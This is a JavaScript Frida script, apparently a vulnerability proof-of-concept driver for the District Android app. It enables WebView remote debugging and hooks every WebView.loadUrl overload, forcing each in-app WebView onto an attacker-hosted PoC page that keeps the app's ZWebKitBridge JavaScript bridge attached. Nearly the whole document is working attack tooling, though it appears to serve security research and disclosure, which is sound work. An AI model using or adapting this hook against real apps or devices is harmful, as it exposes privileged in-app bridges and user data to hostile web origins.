/*
 * District 2.79.0 — ZWebKitBridge PoC driver (Frida, rooted device / emulator)
 *
 * What it does:
 *   1. enables WebView remote debugging (the release build never calls it)
 *   2. forces every in-app WebView to navigate to POC_URL, so the PoC page runs
 *      with ZWebKitBridge attached — this is the "arbitrary origin gets the bridge"
 *      condition you are trying to prove.
 *
 * Usage:
 *   frida -U -f com.application.zomato.district -l hook.js --no-pause
 *
 * Change POC_URL to your hosted page (must be HTTPS — cleartext is blocked by
 * the app's network security config).
 */

var POC_URL = "https://YOUR-HOST/poc.html";

Java.perform(function () {
    var WebView = Java.use("android.webkit.WebView");

    // Release build never calls this -> chrome://inspect shows nothing by default.
    try {
        WebView.setWebContentsDebuggingEnabled(true);
        console.log("[poc] webview debugging enabled");
    } catch (e) {
        console.log("[poc] could not enable debugging: " + e);
    }

    function hookOverload(ov) {
        ov.implementation = function () {
            var args = Array.prototype.slice.call(arguments);
            var ret = ov.apply(this, args);
            var url = args.length ? String(args[0]) : "";

            // avoid replacing our own page / infinite recursion
            if (url.indexOf("http") === 0 && url.indexOf("YOUR-HOST") === -1) {
                var self = this;
                setTimeout(function () {
                    Java.scheduleOnMainThread(function () {
                        try {
                            console.log("[poc] replacing " + url + " with PoC page");
                            self.loadUrl(POC_URL);
                        } catch (e) {
                            console.log("[poc] loadUrl failed: " + e);
                        }
                    });
                }, 1500);
            }
            return ret;
        };
    }

    WebView.loadUrl.overloads.forEach(hookOverload);
    console.log("[poc] hooked WebView.loadUrl (" + WebView.loadUrl.overloads.length + " overloads)");
});
